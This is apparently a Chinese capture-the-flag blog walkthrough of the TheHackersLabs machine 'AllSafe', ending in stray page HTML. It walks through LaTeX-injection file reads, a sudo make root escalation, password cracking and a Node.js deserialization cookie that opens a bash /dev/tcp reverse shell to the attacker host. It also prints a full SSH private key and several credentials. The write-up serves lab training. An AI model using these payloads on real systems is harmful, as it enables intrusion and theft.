+┌──(kali㉿kali)-[~]
+└─$ nmap -p2222 -sC -sV 192.168.205.136                                   
+...
+PORT     STATE SERVICE VERSION
+2222/tcp open  ssh     OpenSSH 10.0p2 Debian 7 (protocol 2.0)
+```
+
+开放端口：22(SSH), 80(HTTP), 2222(SSH)
+
+# 2. **域名发现**
+
+![image-20251019113144223](http://7r1UMPHK.github.io/image/20251019145556227.webp)
+
+源码中发现域名 http://allsafe.thl/
+
+添加hosts并爆破子域名
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo vim /etc/hosts             
+
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ tail -n 1 /etc/hosts                         
+192.168.205.136 allsafe.thl
+                        
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ wfuzz -c -u 'http://allsafe.thl' -H 'HOST:FUZZ.allsafe.thl' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 560
+...
+000000058:   302      0 L     0 W        0 Ch        'intranet - intranet'   
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo vim /etc/hosts
+
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ tail -n 1 /etc/hosts
+192.168.205.136 allsafe.thl intranet.allsafe.thl
+```
+
+发现子域：`intranet.allsafe.thl`
+
+![image-20251019113617538](http://7r1UMPHK.github.io/image/20251019145556489.webp)
+
+需要一个id和密码，去主域看看
+
+# 3. **目录扫描**
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ dirsearch -q -u 192.168.205.136        
+...
+[11:30:06] 200 -  477B  - http://192.168.205.136/assets/
+[11:30:06] 301 -  319B  - http://192.168.205.136/assets  ->  http://192.168.205.136/assets/
+[11:30:07] 200 -    1KB - http://192.168.205.136/contact.php
+[11:30:08] 301 -  319B  - http://192.168.205.136/images  ->  http://192.168.205.136/images/
+[11:30:08] 200 -  684B  - http://192.168.205.136/images/
+[11:30:11] 403 -  280B  - http://192.168.205.136/server-status
+[11:30:11] 403 -  280B  - http://192.168.205.136/server-status/
+[11:30:13] 301 -  318B  - http://192.168.205.136/views  ->  http://192.168.205.136/views/
+```
+
+![image-20251019113726312](http://7r1UMPHK.github.io/image/20251019145553712.webp)
+
+在`our-team.php`找到员工ID：04779990
+
+`contact.php`经过测试没有xxs,sql之类的
+
+扒拉一下intranet
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ dirsearch -q -u http://intranet.allsafe.thl 
+...
+[11:40:56] 200 -  485B  - http://intranet.allsafe.thl/assets/
+[11:40:56] 301 -  329B  - http://intranet.allsafe.thl/assets  ->  http://intranet.allsafe.thl/assets/
+[11:40:58] 200 -    0B  - http://intranet.allsafe.thl/db.php
+[11:40:58] 301 -  327B  - http://intranet.allsafe.thl/docs  ->  http://intranet.allsafe.thl/docs/
+[11:40:58] 200 -  405B  - http://intranet.allsafe.thl/docs/
+[11:40:59] 301 -  329B  - http://intranet.allsafe.thl/images  ->  http://intranet.allsafe.thl/images/
+[11:40:59] 200 -  455B  - http://intranet.allsafe.thl/images/
+[11:41:00] 200 -    1KB - http://intranet.allsafe.thl/login.php
+[11:41:02] 200 -  967B  - http://intranet.allsafe.thl/profile.php
+[11:41:02] 403 -  285B  - http://intranet.allsafe.thl/server-status
+[11:41:02] 403 -  285B  - http://intranet.allsafe.thl/server-status/
+[11:41:04] 301 -  328B  - http://intranet.allsafe.thl/views  ->  http://intranet.allsafe.thl/views/
+```
+
+`profile.php`没啥有价值的
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ gobuster dir -u http://intranet.allsafe.thl -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64
+...
+/images               (Status: 301) [Size: 329] [--> http://intranet.allsafe.thl/images/]
+/index.php            (Status: 302) [Size: 0] [--> login.php]
+/login.php            (Status: 200) [Size: 2075]
+/profile.php          (Status: 200) [Size: 2305]
+/docs                 (Status: 301) [Size: 327] [--> http://intranet.allsafe.thl/docs/]
+/assets               (Status: 301) [Size: 329] [--> http://intranet.allsafe.thl/assets/]
+/customers.php        (Status: 200) [Size: 11072]
+/db.php               (Status: 200) [Size: 0]
+/logout.php           (Status: 302) [Size: 0] [--> login.php]
+/process              (Status: 301) [Size: 330] [--> http://intranet.allsafe.thl/process/]
+/views                (Status: 301) [Size: 328] [--> http://intranet.allsafe.thl/views/]
+```
+
+`customers.php`发现大量用户信息，但是没有密码
+
+在`/process`目录下发现大量疑似生成文件夹
+
+![image-20251019114437353](http://7r1UMPHK.github.io/image/20251019145555722.webp)
+
+通过查看，发现是都是“服务合同”PDF的 LaTeX 生成文件
+
+![image-20251019114529533](http://7r1UMPHK.github.io/image/20251019145705736.webp)
+
+并且通过查看`document.tex`，发现可以读取敏感信息
+
+![image-20251019114642753](http://7r1UMPHK.github.io/image/20251019145557800.webp)
+
+查看了全部的pdf，都是passwd文件或者id_rsa文件，id_rsa文件都是失效的，通过passwd收获两个用户名`goddard` 和`parker`
+
+结合目前的信息来看，需要先进入intranet子域的系统，继续信息收集
+
+收集了好一会，搁置了几天，因为实在找不到，后面我看到有人写wp了，瞄瞄
+
+# 4. **SSRF漏洞利用**
+
+*ps:https://github.com/nohh022/writeups/blob/main/TheHackerLabs/AllSafe/AllSafe.md*
+
+![image-20251019115444746](http://7r1UMPHK.github.io/image/20251019145600866.webp)
+
+c，我试过了127.0.0.1不行，我还以为没有呢
+
+拿到一个密码`123456Seven`
+
+尝试登录
+
+然后这里有一个问题，我的火狐浏览器访问http://intranet.allsafe.thl/login.php会出不来，但是google浏览器可以，所以自己解决一下这个问题吧
+
+```
+0-477-9990
+123456Seven
+```
+
+登录成功
+
+![image-20251019115848173](http://7r1UMPHK.github.io/image/20251019145604630.webp)
+
+加载的也不是很完整，不管了能用就行
+
+# 5. **LaTeX注入读取SSH密钥**
+
+我们已知Empresa字段可以通过`\lstinputlisting{/etc/passwd}`读取文件，我们尝试读取那两个用户的ssh私钥
+
+![image-20251019121327471](http://7r1UMPHK.github.io/image/20251019145711830.webp)
+
+然后生成了，死活不出东西，我去看process的生成文件，发现
+
+![image-20251019121410361](http://7r1UMPHK.github.io/image/20251019145609790.webp)
+
+![image-20251019121428663](http://7r1UMPHK.github.io/image/20251019145613131.webp)
+
+他前端搞反了，我们也调整一下
+
+![image-20251019120804269](http://7r1UMPHK.github.io/image/20251019145614798.webp)
+
+parker的也类似
+
+![image-20251019120956589](http://7r1UMPHK.github.io/image/20251019145620203.webp)
+
+parker的私钥出货了
+
+![image-20251019121518491](http://7r1UMPHK.github.io/image/20251019145622259.webp)
+
+直接复制出来的是有问题的，我们慢慢处理一下
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ vim /tmp/id_rsa 
+                                                                           
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ cat /tmp/id_rsa | sed '1b; $b; s/ //g' > /tmp/id_rsa1
+                                                                           
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ chmod 600 /tmp/id_rsa1                               
+                                                                           
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ ssh-keygen -y -f /tmp/id_rsa1   
+Load key '/tmp/id_rsa1': error in libcrypto
+                                                                           
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ cat -A /tmp/id_rsa1
+M-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RBEGIN OPENSSH PRIVATE KEYM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^R$
+...
+M-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^REND OPENSSH PRIVATE KEYM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^R$
+```
+
+头尾问题，去复制一个标准的就好了
+
+完美的id_rsa
+
+```
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEAmGqHh2o84MpOxktbDf6ENwqdz7xQ4XqZbut/nxIfpevyszfP0kOM
+edI2pX+vZVVTzxJ3GumZYArNWeFScOI90ZCU8bylIihC0i/450XzzN86SgNkOeFIjK5uiU
+78ATZwuJVqRNspyAg4qpohBt43SiJ2ILL75u5lPBzFX9rfeW9kpxU+nuR6P/wTpcqFgZWT
+TuSwfEudYAmBOtG01hrfgtVZzBZ8eqNCjIZmx7HQkeny+sOMdTwkKp8PuBqMyag4E/PYFR
+HF7MunDmbvh0V163FatZYQippXsr3iTt7NT0qOxqNk+kvvWWbbRGBN9VHDByyNC20Hj7W0
+RALgwYDmrwAAA8gz5lrPM+ZazwAAAAdzc2gtcnNhAAABAQCYaoeHajzgyk7GS1sN/oQ3Cp
+3PvFDheplu63+fEh+l6/KzN8/SQ4x50jalf69lVVPPEnca6ZlgCs1Z4VJw4j3RkJTxvKUi
+KELSL/jnRfPM3zpKA2Q54UiMrm6JTvwBNnC4lWpE2ynICDiqmiEG3jdKInYgsvvm7mU8HM
+Vf2t95b2SnFT6e5Ho//BOlyoWBlZNO5LB8S51gCYE60bTWGt+C1VnMFnx6o0KMhmbHsdCR
+6fL6w4x1PCQqnw+4GozJqDgT89gVEcXsy6cOZu+HRXXrcVq1lhCKmleyveJO3s1PSo7Go2
+T6S+9ZZttEYE31UcMHLI0LbQePtbREAuDBgOavAAAAAwEAAQAAAQA7FUi2YKN6zFHfIoUI
+lrowEAh+59Q+o+Toj5foVQE5s45glOkV7CN/cdLHMwkN8hbL9a+AGj/fcDCMgAESS1GFdF
+OYpfUpmYvVqM0G8iIBMCOLX2cx3Lff+RpWVezwl2b41srcKE05Ap7c22SkIe4y6cr7AAcQ
+TSenNsv4TYNFsiRzVDUwISqlp3EhFWPe1GClasPahS3pEDcNiMwRh8mPt7HRG9HqLEPhWv
+9qTpoCnnc30s4Wo9QipdtcxvHrrEPVVrwcz3SJnlCLTlYjiBHZ+gGBl73crSZJOlxNAiow
+A85FBKi6FrWaA3WXrKdCFEh3atKGg5I8kCGhxBkpjn8ZAAAAgCo8745ADp4U7gibCuKs5N
+g7JYWuJDZCYyEClHkWJYdb6CluTJx9DOw0i28Ip8FM8P0YQclTMlU21pwVj1eVXk/5D3kg
+bsBO4hfcSoqewOG0H5U44aiey01z38kz0PL6Z/6JGMzEuSvlHKTJgCGaQSrFcC1X/57LOp
+pViYAqrNC5AAAAgQDPNORYZS8OywkcFN2LZe3uHa4EFZPytnzcPcnQeGWwVqm/12D10vPR
+yeTA0lvIKYkWcClPmiM3/CFQdWPwTyMGryyMv+5+lVJEi0dfHa02jCYKH87pVH35UF6ZPB
+TgvhsrQRFX12vSk/DO30Aa15P/GT4XceHEdM6GlXkOBtILjQAAAIEAvE6vGGynNroa34mv
+cuLE4hu5zK8t167MUX6zNgPDmmoUTwHIRL43ErUo+KpQf1yS3S70Q6xfTQjaxo9S5QuQMR
+CsEojTarhvJ7+VxSKpjjju9Nmuxd2d2vrEPTgrOSijimjkjWK6OhZgemGoKoDUpOf2j8kv
+mKzxF43kdEiETisAAAARcm9vdEAwOTk2MGRmYjE3OGUBAg==
+-----END OPENSSH PRIVATE KEY-----
+```
+
+# 6. **SSH登录与横向移动**
+
+尝试利用
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ vim /tmp/id_rsa
+                       
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ chmod 600 /tmp/id_rsa 
+                                                                           
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ ssh-keygen -y -f /tmp/id_rsa 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCYaoeHajzgyk7GS1sN/oQ3Cp3PvFDheplu63+fEh+l6/KzN8/SQ4x50jalf69lVVPPEnca6ZlgCs1Z4VJw4j3RkJTxvKUiKELSL/jnRfPM3zpKA2Q54UiMrm6JTvwBNnC4lWpE2ynICDiqmiEG3jdKInYgsvvm7mU8HMVf2t95b2SnFT6e5Ho//BOlyoWBlZNO5LB8S51gCYE60bTWGt+C1VnMFnx6o0KMhmbHsdCR6fL6w4x1PCQqnw+4GozJqDgT89gVEcXsy6cOZu+HRXXrcVq1lhCKmleyveJO3s1PSo7Go2T6S+9ZZttEYE31UcMHLI0LbQePtbREAuDBgOav root@09960dfb178e
+                               
+┌──(kali㉿kali)-[/tmp]
+└─$ ssh parker@192.168.205.136  -i /tmp/id_rsa1
+parker@192.168.205.136's password: 
+
+┌──(kali㉿kali)-[/tmp]
+└─$ ssh parker@192.168.205.136 -p 2222 -i /tmp/id_rsa1
+parker@153504fd9bcb:~$ id
+uid=1001(parker) gid=1001(parker) groups=1001(parker)
+```
+
+横向移动
+
+```bash
+parker@153504fd9bcb:~$ cd
+parker@153504fd9bcb:~$ ls -al
+total 24
+drwx---r-x 1 parker parker 4096 Aug 24 18:39 .
+drwxr-xr-x 1 root   root   4096 Aug 24 18:39 ..
+-rw-r--r-- 1 parker parker  220 Jul 30 19:28 .bash_logout
+-rw-r--r-- 1 parker parker 3526 Jul 30 19:28 .bashrc
+-rw-r--r-- 1 parker parker  807 Jul 30 19:28 .profile
+drwxr-xr-x 1 parker parker 4096 Aug 24 18:39 .ssh
+parker@153504fd9bcb:~$ cd /home/
+parker@153504fd9bcb:/home$ ls -al
+total 16
+drwxr-xr-x 1 root    root    4096 Aug 24 18:39 .
+drwxr-xr-x 1 root    root    4096 Oct 11 18:41 ..
+drwx------ 2 goddard goddard 4096 Aug 24 18:39 goddard
+drwx---r-x 1 parker  parker  4096 Aug 24 18:39 parker
+parker@153504fd9bcb:/home$ find / -user $(whoami) ! -path '/proc/*' ! -path '/sys/*' ! -path '/run/*' 2>/dev/null
+/home/parker
+/home/parker/.ssh
+/home/parker/.ssh/id_rsa.pub
+/home/parker/.ssh/id_rsa
+/home/parker/.ssh/authorized_keys
+/home/parker/.bash_logout
+/home/parker/.bashrc
+/home/parker/.profile
+/dev/pts/0
+/var/mail/parker
+/var/mail/parker/meeting
+parker@153504fd9bcb:/home$ cd /var/mail/parker
+parker@153504fd9bcb:/var/mail/parker$ ls -la
+total 12
+drwxr-sr-x 2 parker parker 4096 Aug 24 18:39 .
+drwxrwsr-x 1 root   mail   4096 Aug 24 18:39 ..
+-rw-r--r-- 1 parker parker  898 Aug 24 18:39 meeting
+parker@153504fd9bcb:/var/mail/parker$ cat meeting
+From goddard@localhost Thu Aug 21 14:05:20 2025
+Date: Thu, 21 Aug 2025 14:05:20 +0000
+From: goddard@localhost
+To: parker@localhost
+Subject: Reunión con E-Corp
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary='BOUNDARY'
+
+--BOUNDARY
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+
+Hola Oliver,
+
+Te adjunto las notas que armé para la reunión con el cliente.  
+Revisalo y confirmame si llegamos con todo.
+
+Saludos,  
+Gideon
+
+--BOUNDARY
+Content-Type: text/plain; name='meeting_notes.txt'
+Content-Disposition: attachment; filename='meeting_notes.txt'
+Content-Transfer-Encoding: 7bit
+
+Meeting Notes - E-Corp
+----------------------
+1. Confirmar agenda con el cliente.
+2. Revisar documentación técnica.
+3. Validar acceso al portal con la credencial:
+
+   Clave de acceso: 6D7033386E71556654416130494D314F70306157
+
+4. Preparar demo corta del servicio.
+--BOUNDARY--
+EOF.          
+```
+
+利用https://gchq.github.io/CyberChef/ hex解出`mp38nqUfTAa0IM1Op0aW`
+
+# 7. **容器内提权**
+
+```bash
+parker@153504fd9bcb:/home$ su goddard
+Password: 
+goddard@153504fd9bcb:/home$ id
+uid=1000(goddard) gid=1000(goddard) groups=1000(goddard)
+goddard@153504fd9bcb:/home$ sudo -l
+Matching Defaults entries for goddard on 153504fd9bcb:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User goddard may run the following commands on 153504fd9bcb:
+    (ALL) NOPASSWD: /usr/bin/make
+```
+
+*ps:https://gtfobins.github.io/gtfobins/make/#sudo*
+
+```bash
+goddard@153504fd9bcb:/home$ sudo make -s --eval=$'x:\n\t-''/bin/bash'
+root@153504fd9bcb:/home# id
+uid=0(root) gid=0(root) groups=0(root)
+root@153504fd9bcb:/home# cd
+root@153504fd9bcb:~# ls -al
+total 24
+drwx------ 1 root root 4096 Aug 24 18:39 .
+drwxr-xr-x 1 root root 4096 Oct 11 18:41 ..
+-rw-r--r-- 1 root root  607 May 12 19:25 .bashrc
+-rw-r--r-- 1 root root  132 May 12 19:25 .profile
+drwx------ 2 root root 4096 Aug 24 18:38 .ssh
+-rw-r--r-- 1 root root 1656 Aug 22 16:02 secrets.psafe3
+```
+
+传去kali
+
+```bash
+root@153504fd9bcb:~# scp secrets.psafe3 kali@192.168.205.128:/mnt/hgfs/gx/x/tmp
+...
+secrets.psafe3                               100% 1656   749.5KB/s   00:00 
+```
+
+pwsafe查看
+
+![image-20251019125219858](http://7r1UMPHK.github.io/image/20251019145628481.webp)
+
+要密码，爆破一下
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ pwsafe2john secrets.psafe3 > hash
+                                                                           
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+...
+rockandroll      (secret)     
+...
+```
+
+![image-20251019125504831](http://7r1UMPHK.github.io/image/20251019145630284.webp)
+
+获得cisco密码：`sMpam!dE#8@$$1P%bnV@fFxdqjFFG#`
+
+登录
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ ssh cisco@192.168.205.136
+cisco@192.168.205.136's password: 
+Linux allsafe 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64
+ █████╗ ██╗     ██╗     ███████╗ █████╗ ███████╗███████╗
+██╔══██╗██║     ██║     ██╔════╝██╔══██╗██╔════╝██╔════╝
+███████║██║     ██║     ███████╗███████║█████╗  █████╗  
+██╔══██║██║     ██║     ╚════██║██╔══██║██╔══╝  ██╔══╝  
+██║  ██║███████╗███████╗███████║██║  ██║██║     ███████╗
+╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝
+Last login: Fri Aug 22 23:59:20 2025 from 192.168.1.19
+cisco@allsafe:~$ id
+uid=1002(cisco) gid=1002(cisco) grupos=1002(cisco)
+cisco@allsafe:~$ sudo -l
+sudo: unable to resolve host allsafe: Nombre o servicio desconocido
+[sudo] contraseña para cisco: 
+Sorry, user cisco may not run sudo on allsafe.
+cisco@allsafe:~$ ls -al
+total 32
+drwxr-xr-x 2 cisco cisco 4096 oct 11 20:46 .
+drwxr-xr-x 4 root  root  4096 ago 21 15:30 ..
+lrwxrwxrwx 1 root  root     9 ago 22 17:20 .bash_history -> /dev/null
+-rw-r--r-- 1 cisco cisco  220 abr 23  2023 .bash_logout
+-rw-r--r-- 1 cisco cisco 3526 abr 23  2023 .bashrc
+-rw-r--r-- 1 root  root    37 ago 22 00:48 darkarmy.bin
+-rw-r--r-- 1 cisco cisco  807 abr 23  2023 .profile
+-rw-r--r-- 1 root  root   342 ago 22 00:38 .unknown
+-rw-r--r-- 1 root  root    33 oct 11 20:46 user.txt
+cisco@allsafe:~$ cat user.txt
+e8c459b5b46f5722effe5f2f64421ef3
+cisco@allsafe:~$ strings darkarmy.bin
+70617373776f72643d64726b32303235210a
+```
+
+CyberChef看了一下，还是hex，解除`password=drk2025!`
+
+密码都不对，骗人的
+
+```bash
+cisco@allsafe:~$ ss -tulnp        
+...
+tcp              LISTEN             0                  511                                127.0.0.1:3000                               0.0.0.0:*     ...                             
+cisco@allsafe:~$ ls- al
+-bash: ls-: orden no encontrada
+cisco@allsafe:~$ ls -al
+total 32
+drwxr-xr-x 2 cisco cisco 4096 oct 11 20:46 .
+drwxr-xr-x 4 root  root  4096 ago 21 15:30 ..
+lrwxrwxrwx 1 root  root     9 ago 22 17:20 .bash_history -> /dev/null
+-rw-r--r-- 1 cisco cisco  220 abr 23  2023 .bash_logout
+-rw-r--r-- 1 cisco cisco 3526 abr 23  2023 .bashrc
+-rw-r--r-- 1 root  root    37 ago 22 00:48 darkarmy.bin
+-rw-r--r-- 1 cisco cisco  807 abr 23  2023 .profile
+-rw-r--r-- 1 root  root   342 ago 22 00:38 .unknown
+-rw-r--r-- 1 root  root    33 oct 11 20:46 user.txt
+cisco@allsafe:~$ cat .unknown
+Si quieres comunicarte con nosotros, no vuelvas a usar los canales habituales.
+A partir de ahora, todo contacto será únicamente a través del canal seguro.
+
+Conéctate al servidor de mensajería y entra en la sala:
+    dark-ops
+
+No intentes usar este acceso para nada más que lo acordado.  
+Nosotros decidimos cuándo y cómo se conversa.
+```
+
+经过查看，端口3000是基于 Socket.IO 的聊天应用，我们转发出去
+
+# 8. **端口转发与日志分析**
+
+```bash
+cisco@allsafe:~$ busybox wget 192.168.205.128/socat
+Connecting to 192.168.205.128 (192.168.205.128:80)
+saving to 'socat'
+socat                100% |**********************************************************************************************************************************| 4724k  0:00:00 ETA
+'socat' saved
+cisco@allsafe:~$ chmod +x socat
+cisco@allsafe:~$ ./socat TCP-LISTEN:3001,fork TCP4:127.0.0.1:3000 &
+[1] 2001
+```
+
+没问题，可以访问
+
+![image-20251019130446534](http://7r1UMPHK.github.io/image/20251019145634052.webp)
+
+测试我们刚刚拿到了信息
+
+```
+Gideon
+dark-ops
+6D7033386E71556654416130494D314F70306157
+```
+
+不行，那就是还有东西我们没找到
+扒拉了一个查看修改时间的软件，发现了这个
+
+```bash
+/var/log/app.log         2025-08-22   -rwxr-xr-x         1654
+```
+
+我们可读
+
+```bash
+cisco@allsafe:/tmp$ cat /var/log/app.log
+2025-08-21T12:01:11.233Z [INFO] Server started on port 3000 (PID 2234)
+2025-08-21T12:01:11.235Z [DEBUG] Connected to MySQL at mysql-db:3306
+2025-08-21T12:01:12.004Z [WARN] DeprecationWarning: uuid.v1() is deprecated. Use uuid.v4()
+2025-08-21T12:01:13.551Z [INFO] GET /healthcheck 200 - 2ms
+2025-08-21T12:01:14.232Z [INFO] GET /favicon.ico 404 - 3ms
+2025-08-21T12:01:19.998Z [DEBUG] Cache miss for key: session:oparker
+2025-08-21T12:01:20.012Z [INFO] POST /login 401 - 45ms - user=oparker
+2025-08-21T12:01:20.014Z [ERROR] Invalid credentials for user=oparker ip=10.0.0.12
+
+2025-08-21T12:01:35.783Z [INFO] POST /auth 401 - 62ms - user=shadow
+2025-08-21T12:01:35.784Z [DEBUG] Authentication failed for user shadow using password=123456
+2025-08-21T12:01:36.001Z [WARN] Too many failed attempts for user=shadow from 10.0.0.55
+
+2025-08-21T12:01:40.152Z [INFO] POST /auth 200 - 38ms - user=cisco
+2025-08-21T12:01:40.153Z [DEBUG] Authentication success: password=DLFJYxLLSzp1x5Ttpsffpg2awuJT5K
+2025-08-21T12:01:40.155Z [INFO] Joined secure channel: dark-ops
+
+2025-08-21T12:01:41.998Z [DEBUG] Socket.io message from user=shadow: 'system ready'
+2025-08-21T12:01:42.112Z [INFO] GET /api/clients 200 - 14ms
+2025-08-21T12:01:43.550Z [ERROR] UnhandledPromiseRejectionWarning: TypeError: Cannot read property 'id' of undefined
+2025-08-21T12:01:43.551Z [INFO] Trace: at /srv/app/routes.js:77:19
+2025-08-21T12:01:44.992Z [DEBUG] Cache hit for key: client:ecorp
+2025-08-21T12:01:45.011Z [INFO] POST /reports/upload 500 - 132ms - user=parker
+2025-08-21T12:01:45.012Z [ERROR] Error: File too large (>5MB)
+2025-08-21T12:01:46.200Z [DEBUG] Session destroyed for user=oparker
+```
+
+分析/var/log/app.log获得认证信息
+
+```
+cisco
+dark-ops
+DLFJYxLLSzp1x5Ttpsffpg2awuJT5K
+```
+
+登录成功，我去中文？！
+
+![image-20251019130950990](http://7r1UMPHK.github.io/image/20251019145636883.webp)
+
+没啥东西，测试了ssti之类的也没啥东西
+
+抓个包看看
+
+```bash
+GET / HTTP/1.1
+Host: 192.168.205.136:3001
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Cookie: sess=eyJ1c2VybmFtZSI6ImNpc2NvIn0%3D
+Upgrade-Insecure-Requests: 1
+If-Modified-Since: Wed, 20 Aug 2025 13:34:08 GMT
+If-None-Match: W/'3ce-198c7afdc80'
+Priority: u=0, i
+```
+
+Cookie这个jwt也太短了吧
+
+![image-20251019131355893](http://7r1UMPHK.github.io/image/20251019145639751.webp)
+
+啊这，伪造也没啥价值
+
+问了波ai，说可能是 **Node.js反序列化漏洞**
+
+# **9. Node.js反序列化RCE**
+
+```json
+{
+  'username': '_$$ND_FUNC$$_function(){require('child_process').exec(\'bash -c 'bash -i >& /dev/tcp/192.168.205.128/8888 0>&1'\');}()'
+}
+```
+
+base编码+url编码
+
+```
+ew0KICAidXNlcm5hbWUiOiAiXyQkTkRfRlVOQyQkX2Z1bmN0aW9uKCl7cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoXCJiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMjA1LjEyOC84ODg4IDA%2BJjEnXCIpO30oKSINCn0%3D
+```
+
+kali监听
+
+关键利用包，替换到 Socket.IO 轮询请求
+
+```
+POST /socket.io/?EIO=4&transport=polling&t=a7m0hv65&sid=Zr2kizcum7IVICx8AAAc HTTP/1.1
+Host: 192.168.205.136:3001
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0
+Accept: */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate, br
+Content-type: text/plain;charset=UTF-8
+Content-Length: 49
+Origin: http://192.168.205.136:3001
+Connection: keep-alive
+Cookie: sess=ew0KICAidXNlcm5hbWUiOiAiXyQkTkRfRlVOQyQkX2Z1bmN0aW9uKCl7cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoXCJiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMjA1LjEyOC84ODg4IDA%2BJjEnXCIpO30oKSINCn0%3D
+
+40{'username':'anon','room':'general','token':''}
+```
+
+监听并获取反弹 shell：
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nc -lvnp 8888                                                                                                                                                                
+listening on [any] 8888 ...
+connect to [192.168.205.128] from (UNKNOWN) [192.168.205.136] 41224
+bash: no se puede establecer el grupo de proceso de terminal (377): Función ioctl no apropiada para el dispositivo
+bash: no hay control de trabajos en este shell
+root@allsafe:~/app/src# id
+id
+uid=0(root) gid=0(root) grupos=0(root)
+root@allsafe:~/app/src# cd  
+cd
+root@allsafe:~# cat /root/root.txt   
+cat /root/root.txt
+74d1b217518f030ed2c911f77413f394
+root@allsafe:~# find / -name 'user.txt' 2>/dev/null
+find / -name 'user.txt' 2>/dev/null
+/home/cisco/user.txt
+root@allsafe:~# cat /home/cisco/user.txt
+cat /home/cisco/user.txt
+e8c459b5b46f5722effe5f2f64421ef3
+```
+
+# 10. 聊聊
+
+thehackerslabs的强度又起来了，好事
+
+它的网址是：https://labs.thehackerslabs.com/ 
+
+想打的可以打打。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPHK.github.io/post/thl_allsafe.html">
+<meta property="og:image" content="https://7r1umphk.github.io/image/20250716100121947.webp">
+<title>thl_allsafe</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">thl_allsafe</h1>
+<div class="title-right">
+    <a href="https://7r1UMPHK.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
